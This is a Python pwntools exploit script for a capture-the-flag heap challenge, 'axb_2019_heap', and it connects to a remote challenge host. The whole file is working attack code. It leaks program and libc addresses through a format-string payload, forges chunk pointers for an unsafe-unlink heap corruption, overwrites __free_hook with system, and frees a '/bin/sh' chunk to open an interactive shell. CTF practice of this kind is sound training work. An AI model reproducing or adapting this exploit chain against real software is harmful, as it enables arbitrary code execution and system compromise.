#! /usr/bin/python

from pwn import *
from LibcSearcher import *

debug = 0
context.log_level = 'debug'

if debug:
	p = process('./axb_2019_heap')
	elf = ELF('./axb_2019_heap')
else:
	p = remote('node3.buuoj.cn',26798)
	elf = ELF('./axb_2019_heap')

def menu(choice):
	p.recvuntil('>> ')
	p.sendline(str(choice))

def add(idx,size,content):
	menu(1)
	p.recvuntil('(0-10):')
	p.sendline(str(idx))
	p.recvuntil('Enter a size:\n')
	p.sendline(str(size))
	p.recvuntil('Enter the content: \n')
	p.sendline(content)

def delete(idx):
	menu(2)
	p.recvuntil('Enter an index:\n')
	p.sendline(str(idx))

def edit(idx,content):
	menu(4)
	p.recvuntil('Enter an index:\n')
	p.sendline(str(idx))
	p.recvuntil('Enter the content: \n')
	p.sendline(content)

###leak libc###
payload = '%11$p%15$p'
p.recvuntil('Enter your name: ')
p.sendline(payload)

p.recvuntil('Hello, ')
base = int(p.recv(14),16) - 0x1186
libc_start_main = int(p.recv(14),16) - 240
success(hex(base))
success(hex(libc_start_main))

libc = LibcSearcher('__libc_start_main',libc_start_main)
libc_base = libc_start_main - libc.dump('__libc_start_main')
system = libc_base + libc.dump('system')

###unlink###
heap_array = base + 0x202060
free_hook = libc_base + libc.dump('__free_hook')
chunk = heap_array + 0x10
fake_FD = chunk - 0x18
fake_BK = chunk - 0x10

add(0,0x98,'aaaa')
add(1,0x98,'bbbb')
add(2,0x98,'cccc')
add(3,0x90,'dddd')
add(4,0x90,'/bin/sh\x00')

payload = p64(0) + p64(0x90) + p64(fake_FD) + p64(fake_BK)
payload = payload.ljust(0x90,'A')
payload+= p64(0x90) + '\xa0'
edit(1,payload)
delete(2)

payload = 'A' * 0x8 + p64(free_hook) + p64(0x98)
edit(1,payload)

payload = p64(system)
edit(0,payload)

###get shell###
delete(4)
p.interactive()
